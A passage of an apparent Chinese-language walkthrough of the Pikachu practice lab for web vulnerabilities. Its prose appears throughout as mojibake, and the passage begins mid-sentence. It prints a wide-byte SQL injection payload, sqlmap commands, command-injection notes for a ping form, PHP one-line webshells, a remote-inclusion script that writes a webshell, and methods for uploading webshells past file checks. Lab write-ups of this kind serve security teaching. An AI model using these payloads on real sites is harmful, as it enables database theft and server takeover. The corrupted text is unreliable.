å±‚çš„$sql==&gt;mysqlå¤„ç†è¯·æ±‚==&gt;mysqlä¸­çš„sql\n\npayload:name=kobe%20%df&#39;%20union%20select%201%2C(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase())%20limit%200%2C1#&amp;submit=%E6%9F%A5%E8%AF%A2\n\nSQLmapæˆ‘ä»¬å†ç”¨sqlmapæ¥ä¸€éè¿™ä¸ªé¢˜ç›®\næ•°å­—å‹æ³¨å…¥è¿™é¢˜æ˜¯postå‹,æˆ‘ä»¬å…ˆæŠ“ä¸€ä¸ªpostçš„åŒ…\n\nPOST /vul/sqli/sqli_id.php HTTP/1.1Host: localhostContent-Length: 29Cache-Control: max-age=0sec-ch-ua: â€œChromiumâ€;v=â€95â€, â€œ;Not A Brandâ€;v=â€99â€sec-ch-ua-mobile: ?0sec-ch-ua-platform: â€œWindowsâ€Upgrade-Insecure-Requests: 1Origin: http://localhostContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://localhost/vul/sqli/sqli_id.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=70en5hdmaav0gib3anlocf62h7Connection: close\nid=1&amp;submit=%E6%9F%A5%E8%AF%A2\n\npython .\\sqlmap.py -r 1.txt -p id --dbs --batch\nå­—ç¬¦å‹æ³¨å…¥  python .\\sqlmap.py -u http://localhost/vul/sqli/sqli_str.php?name=1&quot;&amp;submit=æŸ¥è¯¢&quot; --dbs --batch\næœç´¢å‹æ³¨å…¥python .\\sqlmap.py -u http://localhost/vul/sqli/sqli_search.php?name=1&quot;&amp;submit=æŸ¥è¯¢&quot; --dbs --batch\nxxxå‹æ³¨å…¥åŒä¸Š,ä»ç„¶å¯ä»¥æ‰“å‡º\n python .\\sqlmap.py -u http://localhost/vul/sqli/sqli_x.php?name=1&quot;&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --dbs --batch\nâ€œinsert/updateâ€æ³¨å…¥ python .\\sqlmap.py -r 1.txt -p add --dbs --batch\nâ€œdeleteâ€æ³¨å…¥ç»§ç»­ä¸Šè¿°payloadå³å¯\nhttpå¤´æ³¨å…¥sqlmap --level æœ‰äº”ä¸ªç­‰çº§,é»˜è®¤ä¸º1,2æ˜¯cookieæ³¨å…¥,3æ˜¯UAæ³¨å…¥,4æ˜¯refereæ³¨å…¥,5æ˜¯hostæ³¨å…¥,è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨level3\npython .\\sqlmap.py -r 1.txt -p User-Agent --level 3 --batch --dbs\nåŸºäºbooliançš„ç›²æ³¨RCE\nRCE(remote command/code execute)æ¦‚è¿°\nRCEæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚\nè¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚ è€Œï¼Œå¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨\nç°åœ¨å¾ˆå¤šçš„ç”²æ–¹ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡â€è‡ªåŠ¨åŒ–è¿ç»´å¹³å°â€è¿›è¡Œæ“ä½œã€‚ åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´,ä¸ä¿¡çš„è¯ç°åœ¨å°±å¯ä»¥æ‰¾ä½ ä»¬è¿ç»´éƒ¨çš„ç³»ç»Ÿæµ‹è¯•ä¸€ä¸‹,ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„â€æ”¶è·â€-_-\nè¿œç¨‹ä»£ç æ‰§è¡ŒåŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚\nå› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚\nä½ å¯ä»¥é€šè¿‡â€œRCEâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚\n\nexec â€œpingâ€è¿™é‡Œåº”è¯¥æ˜¯åç«¯æ‰§è¡Œäº†shell pingå‘½ä»¤,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯•ä¸€ä¸‹|å’Œ`&amp;\n\n\néƒ½å¯ä»¥æ‰§è¡ŒæˆåŠŸå°±ç›´æ¥ç›¸å½“äºæ‹¿åˆ°äº†æœåŠ¡å™¨shell\nexec â€œevalâ€\næ–‡ä»¶åŒ…å«\nFile Inclusion(æ–‡ä»¶åŒ…å«æ¼æ´)æ¦‚è¿°\næ–‡ä»¶åŒ…å«ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚åœ¨å„ç§å¼€å‘è¯­è¨€ä¸­éƒ½æä¾›äº†å†…ç½®çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå…¶å¯ä»¥ä½¿å¼€å‘äººå‘˜åœ¨ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ç›´æ¥åŒ…å«ï¼ˆå¼•å…¥ï¼‰å¦å¤–ä¸€ä¸ªä»£ç æ–‡ä»¶ã€‚ æ¯”å¦‚ åœ¨PHPä¸­ï¼Œæä¾›äº†ï¼šinclude(),include_once()require(),require_once()è¿™äº›æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åœ¨ä»£ç è®¾è®¡ä¸­è¢«ç»å¸¸ä½¿ç”¨åˆ°ã€‚\nå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ä¸­åŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚ ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œæ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ æ”»å‡»ç€ä¼šæŒ‡å®šä¸€ä¸ªâ€œæ„æƒ³ä¸åˆ°â€çš„æ–‡ä»¶è®©åŒ…å«å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé€ æˆæ¶æ„æ“ä½œã€‚ æ ¹æ®ä¸åŒçš„é…ç½®ç¯å¢ƒï¼Œæ–‡ä»¶åŒ…å«æ¼æ´åˆ†ä¸ºå¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼š1.æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼šä»…èƒ½å¤Ÿå¯¹æœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œç”±äºæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶ä¸æ˜¯æ”»å‡»è€…æ‰€èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œå› æ­¤è¯¥æƒ…å†µä¸‹ï¼Œæ”»å‡»ç€æ›´å¤šçš„ä¼šåŒ…å«ä¸€äº› å›ºå®šçš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œä»è€Œè¯»å–ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯ã€‚å¾ˆå¤šæ—¶å€™æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¼šç»“åˆä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä»è€Œå½¢æˆæ›´å¤§çš„å¨åŠ›ã€‚2.è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼šèƒ½å¤Ÿé€šè¿‡urlåœ°å€å¯¹è¿œç¨‹çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„ä»£ç ï¼Œè¿™ç§æƒ…å†µæ²¡å•¥å¥½è¯´çš„ï¼Œå‡†å¤‡æŒ‚å½©ã€‚\nå› æ­¤ï¼Œåœ¨webåº”ç”¨ç³»ç»Ÿçš„åŠŸèƒ½è®¾è®¡ä¸Šå°½é‡ä¸è¦è®©å‰ç«¯ç”¨æˆ·ç›´æ¥ä¼ å˜é‡ç»™åŒ…å«å‡½æ•°ï¼Œå¦‚æœéè¦è¿™ä¹ˆåšï¼Œä¹Ÿä¸€å®šè¦åšä¸¥æ ¼çš„ç™½åå•ç­–ç•¥è¿›è¡Œè¿‡æ»¤ã€‚\nä½ å¯ä»¥é€šè¿‡â€œFile Inclusionâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚\n\næœ¬åœ°æ–‡ä»¶åŒ…å«æˆ‘ä»¬åœ¨ç›®å½•ä¸‹æ–°å»ºä¸ªtxt,ä¸€ä¼šé€šè¿‡webé¡µé¢è¯»å®ƒ\nç„¶åæˆ‘ä»¬ç›´æ¥åœ¨urlé‡Œè¾“å…¥ç›®å½•å°±å¯ä»¥\nè¿œç¨‹æ–‡ä»¶åŒ…å«è¿™é¢˜æ²¡æœ‰æŠŠincludeå†™å…¥æºç é‡Œ,éœ€è¦æˆ‘ä»¬åœ¨urlé‡ŒåŠ ä¸Š,å½“ç„¶ä¹Ÿå°±ç»™äº†æˆ‘ä»¬ä¸€ä¸ªè¿œç¨‹åˆ©ç”¨çš„æœºä¼š\næˆ‘ä»¬åœ¨è¿œç¨‹æœåŠ¡å™¨å†™ä¸€ä¸ªå¯ä»¥å†™æ–‡ä»¶çš„phpè¯­å¥,ç„¶åå†™ä¸Šä¸€å¥è¯æœ¨é©¬,åƒè¿™æ ·\n&lt;?php$myfile = fopen(&quot;1.php&quot;,&quot;w&quot;);$txt = &#x27;&lt;?php system($_POST[1]);?&gt;&#x27;;fwrite($myfile,$txt);fclose($myfile);?&gt;\n\n\npikachuæˆåŠŸè¢«æˆ‘ä»¬ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬\n\nä¸Šè¿°æ–¹æ³•å¾ˆæ˜æ˜¾æ˜¯éå¸¸ç¹æ‚çš„,é‚£æœ‰æ²¡æœ‰ä»€ä¹ˆç®€å•ç²—æš´çš„æ–¹æ³•å‘¢,å½“ç„¶æœ‰,ä¸Šè¾¹1.txtæ˜¯å¯ä»¥æ‰§è¡Œçš„,é‚£æˆ‘ä»¬æŠŠ1.txtç›´æ¥å†™æˆä¸€å¥è¯æœ¨é©¬ä¸ä¹…å¯ä»¥äº†å—\n&lt;?php eval($_POST[1]);?&gt;\n\n\nä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½\nä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¦‚è¿°\næ–‡ä»¶ä¸‹è½½åŠŸèƒ½åœ¨å¾ˆå¤šwebç³»ç»Ÿä¸Šéƒ½ä¼šå‡ºç°ï¼Œä¸€èˆ¬æˆ‘ä»¬å½“ç‚¹å‡»ä¸‹è½½é“¾æ¥ï¼Œä¾¿ä¼šå‘åå°å‘é€ä¸€ä¸ªä¸‹è½½è¯·æ±‚ï¼Œä¸€èˆ¬è¿™ä¸ªè¯·æ±‚ä¼šåŒ…å«ä¸€ä¸ªéœ€è¦ä¸‹è½½çš„æ–‡ä»¶åç§°ï¼Œåå°åœ¨æ”¶åˆ°è¯·æ±‚å ä¼šå¼€å§‹æ‰§è¡Œä¸‹è½½ä»£ç ï¼Œå°†è¯¥æ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶responseç»™æµè§ˆå™¨ï¼Œä»è€Œå®Œæˆä¸‹è½½ã€‚ å¦‚æœåå°åœ¨æ”¶åˆ°è¯·æ±‚çš„æ–‡ä»¶åå,å°†å…¶ç›´æ¥æ‹¼è¿›ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ä¸­è€Œä¸å¯¹å…¶è¿›è¡Œå®‰å…¨åˆ¤æ–­çš„è¯ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚æ­¤æ—¶å¦‚æœ æ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„çš„æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è·¯å¾„(æ¯”å¦‚../../../etc/passwd),åˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥å°†è¯¥æŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ ä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯(å¯†ç æ–‡ä»¶ã€æºä»£ç ç­‰)è¢«ä¸‹è½½ã€‚\næ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸‹è½½åŠŸèƒ½æ—¶ï¼Œå¦‚æœä¸‹è½½çš„ç›®æ ‡æ–‡ä»¶æ˜¯ç”±å‰ç«¯ä¼ è¿›æ¥çš„ï¼Œåˆ™ä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œå®‰å…¨è€ƒè™‘ã€‚ åˆ‡è®°ï¼šæ‰€æœ‰ä¸å‰ç«¯äº¤äº’çš„æ•°æ®éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œä¸èƒ½æ‰ä»¥è½»å¿ƒï¼\nä½ å¯ä»¥é€šè¿‡â€œUnsafe file downloadâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚\n\nä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½è¿™é‡Œå¯ä»¥ç±»æ¯”äºæ–‡ä»¶åŒ…å«,æˆ‘ä»¬å¯ä»¥ä¸‹è½½åˆ°è‡ªå·±æƒ³è¦çš„ä»»ä½•è™šæ‹Ÿæœºæ–‡ä»¶,è¿™é‡Œæˆ‘é‡‡ç”¨ä¸¤ç§æ–¹æ³•ç¬¬ä¸€ç§æ˜¯bpæŠ“åŒ…æ”¹åŒ…\nç¬¬äºŒç§ç›´æ¥F12ä¿®æ”¹ä¸€ä¸‹ä¸‹è½½è·¯å¾„\nä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ \nä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´æ¦‚è¿°\næ–‡ä»¶ä¸Šä¼ åŠŸèƒ½åœ¨webåº”ç”¨ç³»ç»Ÿå¾ˆå¸¸è§ï¼Œæ¯”å¦‚å¾ˆå¤šç½‘ç«™æ³¨å†Œçš„æ—¶å€™éœ€è¦ä¸Šä¼ å¤´åƒã€ä¸Šä¼ é™„ä»¶ç­‰ç­‰ã€‚å½“ç”¨æˆ·ç‚¹å‡»ä¸Šä¼ æŒ‰é’®åï¼Œåå°ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œåˆ¤æ–­ æ¯”å¦‚æ˜¯å¦æ˜¯æŒ‡å®šçš„ç±»å‹ã€åç¼€åã€å¤§å°ç­‰ç­‰ï¼Œç„¶åå°†å…¶æŒ‰ç…§è®¾è®¡çš„æ ¼å¼è¿›è¡Œé‡å‘½ååå­˜å‚¨åœ¨æŒ‡å®šçš„ç›®å½•ã€‚ å¦‚æœè¯´åå°å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œä»»ä½•çš„å®‰å…¨åˆ¤æ–­æˆ–è€…åˆ¤æ–­æ¡ä»¶ä¸å¤Ÿä¸¥è°¨ï¼Œåˆ™æ”»å‡»ç€å¯èƒ½ä¼šä¸Šä¼ ä¸€äº›æ¶æ„çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€å¥è¯æœ¨é©¬ï¼Œä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨è¢«webshellã€‚\næ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ã€‚æ¯”å¦‚ï¼šâ€“éªŒè¯æ–‡ä»¶ç±»å‹ã€åç¼€åã€å¤§å°;â€“éªŒè¯æ–‡ä»¶çš„ä¸Šä¼ æ–¹å¼;â€“å¯¹æ–‡ä»¶è¿›è¡Œä¸€å®šå¤æ‚çš„é‡å‘½å;â€“ä¸è¦æš´éœ²æ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„;â€“ç­‰ç­‰â€¦\nä½ å¯ä»¥é€šè¿‡â€œUnsafe file uploadâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚\n\nå®¢æˆ·ç«¯checkè¿™é‡Œå¯ä»¥ç®€å•ç†è§£æˆå‰ç«¯éªŒè¯,ç„¶åJavaScriptè·³å‡ºæ¥ç»„ç»‡ä½ ä¸Šä¼ ,é‚£æˆ‘ä»¬åªè¦æŠŠJavaScriptç¦ç”¨äº†å°±ä¸ä¼šæœ‰ä»»ä½•ä¸œè¥¿é˜»æ­¢æˆ‘ä»¬ä¼ é©¬äº†,è¿™é‡Œæˆ‘åœ¨chrome storeéšä¾¿ä¸‹è½½äº†ä¸€ä¸ª\nç„¶åå°±å¯ä»¥ä¼ ä¸Šphpä¸€å¥è¯æœ¨é©¬\n&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;\n\n\nèšå‰‘å°±å¯ä»¥è¿æ¥äº†\næœåŠ¡ç«¯checkè¿™é‡Œåªæ˜¯éªŒè¯äº†Content-Typeæˆ‘ä»¬æŠ“åŒ…æ”¹åŒ…å°±å¯ä»¥æ‹¿ä¸‹è¿˜æ˜¯åˆ©ç”¨ä¸Šé¢˜çš„ä¸€å¥è¯æœ¨é©¬å°±å¯ä»¥è§£å†³\n&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;\n\ngetimagesize()$type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//æŒ‡å®šç±»å‹$mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);$save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//æ ¹æ®å½“å¤©æ—¥æœŸç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹$upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//è°ƒç”¨å‡½æ•°\n\nè¿™é¢˜ä¼šæ£€æŸ¥å›¾ç‰‡çš„ç‰¹å¾,æ‰€ä»¥æˆ‘ä»¬ç›´æ¥åœ¨ä¸€å¼ å›¾ç‰‡é‡Œéšå†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬åƒè¿™æ ·\n\næˆ‘ä»¬ä¸Šä¼ è¿™å¼ å›¾ç‰‡,å‘ç°å¯ä»¥ä¸Šä¼ æˆåŠŸ,å¹¶ä¸”å›¾ç‰‡é‡Œæœ‰ä¸€å¥è¯æœ¨é©¬,ä½†æ˜¯æˆ‘ä»¬è¿™æ ·è¯»å–æ˜¯ä»¥å›¾ç‰‡çš„å½¢å¼è¯»å–,æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬æ˜¯æ²¡æ³•æ‰§è¡Œçš„è¿™æ—¶å€™æœ‰ä¸ªæ¯”è¾ƒå·§å¦™çš„åŠæ³•å°±æ˜¯åˆ©ç”¨å‰è¾¹çš„æ–‡ä»¶åŒ…å«å»è¯»å–æˆ‘ä»¬ç°åœ¨æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•\nè¶Šæƒ\nå¦‚æœä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼ŒAçš„æƒé™å°äºBçš„æƒé™ï¼Œå¦‚æœèƒ½å¤ŸæˆåŠŸæ“ä½œï¼Œåˆ™ç§°ä¹‹ä¸ºè¶Šæƒæ“ä½œã€‚ è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº† ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚\nä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹ å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œçœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´ã€‚\nå› æ­¤ï¼Œåœ¨åœ¨æƒé™ç®¡ç†ä¸­åº”è¯¥éµå®ˆï¼š1.ä½¿ç”¨æœ€å°æƒé™åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œèµ‹æƒ;2.ä½¿ç”¨åˆç†ï¼ˆä¸¥æ ¼ï¼‰çš„æƒé™æ ¡éªŒè§„åˆ™;3.ä½¿ç”¨åå°ç™»å½•æ€ä½œä¸ºæ¡ä»¶è¿›è¡Œæƒé™åˆ¤æ–­,åˆ«åŠ¨ä¸åŠ¨å°±çç”¨å‰ç«¯ä¼ è¿›æ¥çš„æ¡ä»¶;\nä½ å¯ä»¥é€šè¿‡â€œOver permissionâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚\n\næ°´å¹³è¶Šæƒè¿™é‡Œæˆ‘ä»¬å…ˆç™»å½•lucyçš„è´¦å·çœ‹ä¸€ä¸‹\nè¿™é‡Œæˆ‘ä»¬ç›´æ¥å°†urlåœ°å€æ”¹æˆkobeè¯•ä¸€ä¸‹\næ˜¾ç„¶, æˆ‘ä»¬æˆåŠŸè®¿é—®åˆ°äº†kobeçš„æ‰€æœ‰ä¿¡æ¯\nå‚ç›´è¶Šæƒæˆ‘ä»¬å…ˆç™»å½•adminçœ‹ä¸€ä¸‹, å¯ä»¥å‘ç°adminæ˜¯å¯ä»¥æ·»åŠ ç”¨æˆ·çš„\né‚£æˆ‘ä»¬ç”¨pikachuç”¨æˆ·è¯•ä¸€ä¸‹èƒ½ä¸èƒ½æ·»åŠ ç”¨æˆ·å‘¢?\n\nåˆ›å»ºæˆåŠŸ!\n\nç›®å½•éå†\nç›®å½•éå†æ¼æ´æ¦‚è¿°\nåœ¨webåŠŸèƒ½è®¾è®¡ä¸­,å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šè¦å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œä»è€Œè®©å‰ç«¯çš„åŠŸèƒ½ä¾¿çš„æ›´åŠ çµæ´»ã€‚ å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªå‰ç«¯çš„è¯·æ±‚æ—¶ï¼Œä¾¿ä¼šå°†è¯·æ±‚çš„è¿™ä¸ªæ–‡ä»¶çš„å€¼(æ¯”å¦‚æ–‡ä»¶åç§°)ä¼ é€’åˆ°åå°ï¼Œåå°å†æ‰§è¡Œå…¶å¯¹åº”çš„æ–‡ä»¶ã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœåå°æ²¡æœ‰å¯¹å‰ç«¯ä¼ è¿›æ¥çš„å€¼è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡â€œ../â€è¿™æ ·çš„æ‰‹æ®µè®©åå°æ‰“å¼€æˆ–è€…æ‰§è¡Œä¸€äº›å…¶ä»–çš„æ–‡ä»¶ã€‚ ä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨ä¸Šå…¶ä»–ç›®å½•çš„æ–‡ä»¶ç»“æœè¢«éå†å‡ºæ¥ï¼Œå½¢æˆç›®å½•éå†æ¼æ´ã€‚\nçœ‹åˆ°è¿™é‡Œ,ä½ å¯èƒ½ä¼šè§‰å¾—ç›®å½•éå†æ¼æ´å’Œä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ï¼Œç”šè‡³æ–‡ä»¶åŒ…å«æ¼æ´æœ‰å·®ä¸å¤šçš„æ„æ€ï¼Œæ˜¯çš„ï¼Œç›®å½•éå†æ¼æ´å½¢æˆçš„æœ€ä¸»è¦çš„åŸå› è·Ÿè¿™ä¸¤è€…ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨åŠŸèƒ½è®¾è®¡ä¸­å°†è¦æ“ä½œçš„æ–‡ä»¶ä½¿ç”¨å˜é‡çš„ æ–¹å¼ä¼ é€’ç»™äº†åå°ï¼Œè€Œåˆæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘è€Œé€ æˆçš„ï¼Œåªæ˜¯å‡ºç°çš„ä½ç½®æ‰€å±•ç°çš„ç°è±¡ä¸ä¸€æ ·ï¼Œå› æ­¤ï¼Œè¿™é‡Œè¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥å®šä¹‰ä¸€ä¸‹ã€‚\néœ€è¦åŒºåˆ†ä¸€ä¸‹çš„æ˜¯,å¦‚æœä½ 